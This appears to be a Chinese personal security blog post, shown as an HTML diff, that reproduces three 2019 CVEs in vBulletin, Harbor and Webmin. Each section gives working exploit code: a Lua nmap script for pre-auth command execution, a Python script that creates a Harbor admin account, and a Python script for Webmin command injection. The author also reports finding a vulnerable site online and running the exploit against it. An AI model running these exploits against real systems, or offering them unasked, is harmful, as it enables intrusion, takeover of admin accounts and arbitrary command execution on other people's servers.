@@ -1,0 +1,1358 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="cn">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+  
+  
+    
+      
+    
+    
+      
+    
+  <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+  <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-flash.min.css" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic|Monda:300,300italic,400,400italic,700,700italic|Lobster Two:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+  
+
+<link href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=6.4.0" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.4.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.4.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.4.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.4.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '6.4.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="我的善良和恶毒都不够纯粹，所以痛苦！  文章目录：  CVE-2019-16759 CVE-2019-16097 CVE-2019-15107">
+<meta name="keywords" content="vbulletin,Harbor,Webmin">
+<meta property="og:type" content="article">
+<meta property="og:title" content="最近爆出的漏洞复现">
+<meta property="og:url" content="https://lengjibo.github.io/rce/index.html">
+<meta property="og:site_name" content="冷逸的个人博客|开往安河桥北~">
+<meta property="og:description" content="我的善良和恶毒都不够纯粹，所以痛苦！  文章目录：  CVE-2019-16759 CVE-2019-16097 CVE-2019-15107">
+<meta property="og:locale" content="cn">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g7fi1kdu3lj30ke0aijt0.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g7fijjdac7j30dy0ehjre.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g7fikhcmubj30kt07rq64.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBgy1g7fj9l0ttuj314j0hqael.jpg">
+<meta property="og:updated_time" content="2019-09-28T13:04:12.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="最近爆出的漏洞复现">
+<meta name="twitter:description" content="我的善良和恶毒都不够纯粹，所以痛苦！  文章目录：  CVE-2019-16759 CVE-2019-16097 CVE-2019-15107">
+<meta name="twitter:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g7fi1kdu3lj30ke0aijt0.jpg">
+
+
+
+  <link rel="alternate" href="/../../.deploy_git/atom.xml" title="冷逸的个人博客|开往安河桥北~" type="application/atom+xml" />
+
+
+
+
+  <link rel="canonical" href="https://lengjibo.github.io/rce/"/>
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>最近爆出的漏洞复现 | 冷逸的个人博客|开往安河桥北~</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="cn">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">冷逸的个人博客|开往安河桥北~</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />Startseite</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+    <a href="/about/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br />Über</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />Tags</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br />Kategorien</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />Archiv</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-book">
+    <a href="/book/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-book"></i> <br />book</a>
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+    
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://lengjibo.github.io/rce/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="冷逸">
+      <meta itemprop="description" content="做一个温柔的人...">
+      <meta itemprop="image" content="https://i.screenshot.net/9zoe9ax">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="冷逸的个人博客|开往安河桥北~">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">最近爆出的漏洞复现
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+        
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Veröffentlicht am</span>
+              
+
+              
+                
+              
+
+              <time title="Post created: 2019-09-28 19:59:52 / Updated at: 21:04:12" itemprop="dateCreated datePublished" datetime="2019-09-28T19:59:52+08:00">2019-09-28</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">in</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/web安全/" itemprop="url" rel="index"><span itemprop="name">web安全</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="post-meta-item-icon"
+            >
+            <i class="fa fa-eye"></i>
+             Views:  
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>我的善良和恶毒都不够纯粹，所以痛苦！</p>
+<hr>
+<p>文章目录：</p>
+<ul>
+<li>CVE-2019-16759</li>
+<li>CVE-2019-16097</li>
+<li>CVE-2019-15107</li>
+</ul>
+<a id="more"></a>
+<h2 id="CVE-2019-16759"><a href="#CVE-2019-16759" class="headerlink" title="CVE-2019-16759"></a>CVE-2019-16759</h2><h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p><a href="https://seclists.org/fulldisclosure/2019/Sep/31" target="_blank" rel="noopener">https://seclists.org/fulldisclosure/2019/Sep/31</a></p>
+<p>vBulletin是美国InternetBrands和vBulletinSolutions公司的一款基于PHP和MySQL的开源Web论坛程序。 vBulletin 5.x版本至5.5.4版本中存在安全漏洞。攻击者可借助‘widgetConfig[code]’参数利用该漏洞执行命令。</p>
+<h3 id="漏洞exp"><a href="#漏洞exp" class="headerlink" title="漏洞exp"></a>漏洞exp</h3><p>此exp来源于安全客，是一个nmap的脚本</p>
+<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">description = <span class="string">[[</span></span><br><span class="line"><span class="string">vBulletin 5.x 0day pre-auth RCE exploit</span></span><br><span class="line"><span class="string">This should work on all versions from 5.0.0 till 5.5.4</span></span><br><span class="line"><span class="string">]]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> http = <span class="built_in">require</span> <span class="string">"http"</span></span><br><span class="line"><span class="keyword">local</span> shortport = <span class="built_in">require</span> <span class="string">"shortport"</span></span><br><span class="line"><span class="keyword">local</span> vulns = <span class="built_in">require</span> <span class="string">"vulns"</span></span><br><span class="line"><span class="keyword">local</span> stdnse = <span class="built_in">require</span> <span class="string">"stdnse"</span></span><br><span class="line"><span class="keyword">local</span> <span class="built_in">string</span> = <span class="built_in">require</span> <span class="string">"string"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">---</span></span><br><span class="line"><span class="comment">-- @usage</span></span><br><span class="line"><span class="comment">-- nmap -p &lt;port&gt; --script http-vuln-CVE-2019-16759 &lt;target&gt;</span></span><br><span class="line"><span class="comment">--</span></span><br><span class="line"><span class="comment">-- @output</span></span><br><span class="line"><span class="comment">-- PORT    STATE SERVICE</span></span><br><span class="line"><span class="comment">-- s4430/tcp  open  http</span></span><br><span class="line"><span class="comment">-- | http-vuln-CVE-2019-16759:</span></span><br><span class="line"><span class="comment">-- |   VULNERABLE</span></span><br><span class="line"><span class="comment">-- |   vBulletin 5.x 0day pre-auth RCE exploit</span></span><br><span class="line"><span class="comment">-- |     State: VULNERABLE</span></span><br><span class="line"><span class="comment">-- |     IDs:  CVE:CVE-2019-16759</span></span><br><span class="line"><span class="comment">-- |</span></span><br><span class="line"><span class="comment">-- |     Disclosure date: 2019-09-23</span></span><br><span class="line"><span class="comment">-- |     References:</span></span><br><span class="line"><span class="comment">-- |      https://seclists.org/fulldisclosure/2019/Sep/31</span></span><br><span class="line"><span class="comment">-- |_     https://nvd.nist.gov/vuln/detail/CVE-2019-16759</span></span><br><span class="line"><span class="comment">--</span></span><br><span class="line"><span class="comment">-- @args http-vuln-cve2019-16759.path The default URL path to request. The default is "/".</span></span><br><span class="line"></span><br><span class="line">author = <span class="string">"r00tpgp"</span></span><br><span class="line">license = <span class="string">"Same as Nmap--See https://nmap.org/book/man-legal.html"</span></span><br><span class="line">categories = &#123; <span class="string">"vuln"</span> &#125;</span><br><span class="line"></span><br><span class="line">portrule = shortport.http</span><br><span class="line"></span><br><span class="line">action = <span class="function"><span class="keyword">function</span><span class="params">(host, port)</span></span></span><br><span class="line">  <span class="keyword">local</span> vuln = &#123;</span><br><span class="line">    title = <span class="string">"vBulletin 5.x 0day pre-auth RCE exploit"</span>,</span><br><span class="line">    state = vulns.STATE.NOT_VULN,</span><br><span class="line">    description = <span class="string">[[</span></span><br><span class="line"><span class="string">vBulletin 5.x 0day pre-auth RCE exploit</span></span><br><span class="line"><span class="string">This should work on all versions from 5.0.0 till 5.5.4</span></span><br><span class="line"><span class="string">    ]]</span>,</span><br><span class="line">    IDS = &#123;</span><br><span class="line">        CVE = <span class="string">"CVE-2019-16759"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    references = &#123;</span><br><span class="line">        <span class="string">'https://seclists.org/fulldisclosure/2019/Sep/31'</span>,</span><br><span class="line"><span class="string">'https://nvd.nist.gov/vuln/detail/CVE-2019-16759'</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    dates = &#123;</span><br><span class="line">        disclosure = &#123; year = <span class="string">'2019'</span>, month = <span class="string">'09'</span>, day = <span class="string">'23'</span> &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">local</span> vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">local</span> method = stdnse.get_script_args(SCRIPT_NAME..<span class="string">".method"</span>) <span class="keyword">or</span> <span class="string">"POST"</span></span><br><span class="line">  <span class="keyword">local</span> <span class="built_in">path</span> = stdnse.get_script_args(SCRIPT_NAME..<span class="string">".path"</span>) <span class="keyword">or</span> <span class="string">"/index.php?routestring=ajax/render/widget_php"</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">local</span> body = &#123;</span><br><span class="line">   [<span class="string">"widgetConfig[code]"</span>] = <span class="string">"echo shell_exec(\'echo h4x0000r &gt; /tmp/nmap.check.out; cat /tmp/nmap.check.out\');exit;"</span>,</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">local</span> options = &#123;</span><br><span class="line">    header = &#123;</span><br><span class="line">      Connection = <span class="string">"close"</span>,</span><br><span class="line">      [<span class="string">"Content-Type"</span>] = <span class="string">"application/x-www-form-urlencoded"</span>,</span><br><span class="line">      [<span class="string">"User-Agent"</span>] =  <span class="string">"curl/7.65.3"</span>,</span><br><span class="line">      [<span class="string">"Accept"</span>] = <span class="string">"*/*"</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    content = body</span><br><span class="line">&#125;</span><br><span class="line">  <span class="keyword">local</span> response = http.post(host, port, <span class="built_in">path</span>, <span class="literal">nil</span>, <span class="literal">nil</span>, body)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> response <span class="keyword">and</span> <span class="built_in">string</span>.<span class="built_in">match</span>(response.body, <span class="string">"h4x0000r"</span>) <span class="keyword">then</span></span><br><span class="line">    vuln.state = vulns.STATE.VULN</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> vuln_report:make_output(vuln)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>在网上找到一个存在该漏洞网站</p>
+<p>使用exp执行</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1g7fi1kdu3lj30ke0aijt0.jpg" alt="截图_2019-09-28_20-19-01 (1).png"></p>
+<h2 id="CVE-2019-16097"><a href="#CVE-2019-16097" class="headerlink" title="CVE-2019-16097"></a>CVE-2019-16097</h2><h3 id="漏洞概述-1"><a href="#漏洞概述-1" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>Harbor是一个用于存储和分发Docker镜像的企业级Registry服务器，通过添加一些企业必需的功能特性，例如安全、标识和管理等，扩展了开源Docker Distribution。作为一个企业级私有Registry服务器，Harbor提供了更好的性能和安全。提升用户使用Registry构建和运行环境传输镜像的效率。Harbor支持安装在多个Registry节点的镜像资源复制，镜像全部保存在私有Registry中， 确保数据和知识产权在公司内部网络中管控。另外，Harbor也提供了高级的安全特性，诸如用户管理，访问控制和活动审计等。</p>
+<p>Harbor 1.7.6之前版本和Harbor 1.8.3之前版本中的core/api/user.go文件存在安全漏洞。若开放注册功能，攻击者可利用该漏洞创建admin账户。注册功能默认开放。攻击者可以以管理员身份下载私有项目并审计；可以删除或污染所有镜像。</p>
+<h3 id="漏洞exp-1"><a href="#漏洞exp-1" class="headerlink" title="漏洞exp"></a>漏洞exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">(url)</span>:</span></span><br><span class="line">    bug_url = url + <span class="string">"/api/users"</span></span><br><span class="line">    payload = <span class="string">'&#123;"username":"lengjibo","email":"lengjibo@gmail.com","realname":"lengjiboa","password":"lengjibo123QAQ","comment":"1","has_admin_role":true&#125;'</span></span><br><span class="line">    header = &#123;<span class="string">"Content-Type"</span>: <span class="string">"application/json"</span>,<span class="string">"Accept"</span>: <span class="string">"application/json"</span>&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.post(bug_url,data=payload,headers = header,timeout=<span class="number">10</span>)</span><br><span class="line">        <span class="keyword">print</span> bug_url</span><br><span class="line">        <span class="keyword">print</span> r.status_code</span><br><span class="line">        <span class="keyword">if</span> r.status_code == <span class="number">201</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"[!] This URL is Vulnerable !"</span></span><br><span class="line">            <span class="keyword">print</span> <span class="string">"[!] username: lengjibo   password: lengjibo123QAQ"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"[-] It's nothing."</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        logging.warning(bug_url)</span><br><span class="line">        <span class="keyword">print</span> e</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"CVE-2019-16097-test"</span></span><br><span class="line">    url = raw_input(<span class="string">"[-] Please input URL(e.g. http://test.com:88): "</span>)</span><br><span class="line">    test(url)</span><br></pre></td></tr></table></figure>
+<h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>找到网站的注册处</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1g7fijjdac7j30dy0ehjre.jpg" alt="截图_2019-09-28_20-38-44.png"></p>
+<p>点击注册账号</p>
+<p>添加</p>
+<blockquote>
+<p>“has_admin_role”:true</p>
+</blockquote>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1g7fikhcmubj30kt07rq64.jpg" alt="截图_2019-09-28_20-39-49.png"></p>
+<h2 id="CVE-2019-15107"><a href="#CVE-2019-15107" class="headerlink" title="CVE-2019-15107"></a>CVE-2019-15107</h2><h3 id="漏洞概述-2"><a href="#漏洞概述-2" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><ol>
+<li>Webmin &lt;=1.920</li>
+<li>need enable reset Password function<br><a href="https://10.10.20.166:10000/password_change.cgi" target="_blank" rel="noopener">https://10.10.20.166:10000/password_change.cgi</a></li>
+</ol>
+<h3 id="漏洞exp-2"><a href="#漏洞exp-2" class="headerlink" title="漏洞exp"></a>漏洞exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests.packages.urllib3</span><br><span class="line">requests.packages.urllib3.disable_warnings()</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">banner =<span class="string">'''</span></span><br><span class="line"><span class="string"> _______           _______       _______  _______  __     _____       __    _______  __    _______  ______  </span></span><br><span class="line"><span class="string">(  ____ \|\     /|(  ____ \     / ___   )(  __   )/  \   / ___ \     /  \  (  ____ \/  \  (  __   )/ ___  \ </span></span><br><span class="line"><span class="string">| (    \/| )   ( || (    \/     \/   )  || (  )  |\/) ) ( (   ) )    \/) ) | (    \/\/) ) | (  )  |\/   )  )</span></span><br><span class="line"><span class="string">| |      | |   | || (__             /   )| | /   |  | | ( (___) |      | | | (____    | | | | /   |    /  / </span></span><br><span class="line"><span class="string">| |      ( (   ) )|  __)          _/   / | (/ /) |  | |  \____  |      | | (_____ \   | | | (/ /) |   /  /  </span></span><br><span class="line"><span class="string">| |       \ \_/ / | (            /   _/  |   / | |  | |       ) |      | |       ) )  | | |   / | |  /  /   </span></span><br><span class="line"><span class="string">| (____/\  \   /  | (____/\     (   (__/\|  (__) |__) (_/\____) )    __) (_/\____) )__) (_|  (__) | /  /    </span></span><br><span class="line"><span class="string">(_______/   \_/   (_______/_____\_______/(_______)\____/\______/_____\____/\______/ \____/(_______) \_/     </span></span><br><span class="line"><span class="string">                          (_____)                              (_____)                                      </span></span><br><span class="line"><span class="string">                                     python By jas502n</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">print</span> banner</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CVE_2019_15107</span><span class="params">(url, cmd)</span>:</span></span><br><span class="line">    vuln_url = url + <span class="string">"/password_change.cgi"</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">    <span class="string">'Accept-Encoding'</span>: <span class="string">"gzip, deflate"</span>,</span><br><span class="line">    <span class="string">'Accept'</span>: <span class="string">"*/*"</span>,</span><br><span class="line">    <span class="string">'Accept-Language'</span>: <span class="string">"en"</span>,</span><br><span class="line">    <span class="string">'User-Agent'</span>: <span class="string">"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)"</span>,</span><br><span class="line">    <span class="string">'Connection'</span>: <span class="string">"close"</span>,</span><br><span class="line">    <span class="string">'Cookie'</span>: <span class="string">"redirect=1; testing=1; sid=x; sessiontest=1"</span>,</span><br><span class="line">    <span class="string">'Referer'</span>: <span class="string">"%s/session_login.cgi"</span>%url,</span><br><span class="line">    <span class="string">'Content-Type'</span>: <span class="string">"application/x-www-form-urlencoded"</span>,</span><br><span class="line">    <span class="string">'Content-Length'</span>: <span class="string">"60"</span>,</span><br><span class="line">    <span class="string">'cache-control'</span>: <span class="string">"no-cache"</span></span><br><span class="line">    &#125; </span><br><span class="line">    payload=<span class="string">"user=rootxx&amp;pam=&amp;expired=2&amp;old=test|%s&amp;new1=test2&amp;new2=test2"</span> % cmd</span><br><span class="line">    r = requests.post(url=vuln_url, headers=headers, data=payload, verify=<span class="keyword">False</span>)</span><br><span class="line">    <span class="keyword">if</span> r.status_code ==<span class="number">200</span> <span class="keyword">and</span> <span class="string">"The current password is "</span> <span class="keyword">in</span> r.content : </span><br><span class="line">        <span class="keyword">print</span> <span class="string">"\nvuln_url= %s"</span> % vuln_url</span><br><span class="line">        m = re.compile(<span class="string">r"&lt;center&gt;&lt;h3&gt;Failed to change password : The current password is incorrect(.*)&lt;/h3&gt;&lt;/center&gt;"</span>, re.DOTALL)</span><br><span class="line">        cmd_result = m.findall(r.content)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">print</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Command Result = %s"</span> % cmd_result</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"No Vuln Exit!"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="comment"># url = "https://10.10.20.166:10000"</span></span><br><span class="line">    url = sys.argv[<span class="number">1</span>]</span><br><span class="line">    cmd = sys.argv[<span class="number">2</span>]</span><br><span class="line">    CVE_2019_15107(url, cmd)</span><br></pre></td></tr></table></figure>
+<h3 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>实在是没找到相关的站点….</p>
+<p>附一张测试截图</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBgy1g7fj9l0ttuj314j0hqael.jpg" alt="CVE-2019-15107.jpg"></p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    <div>
+      
+        
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+  
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
+  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
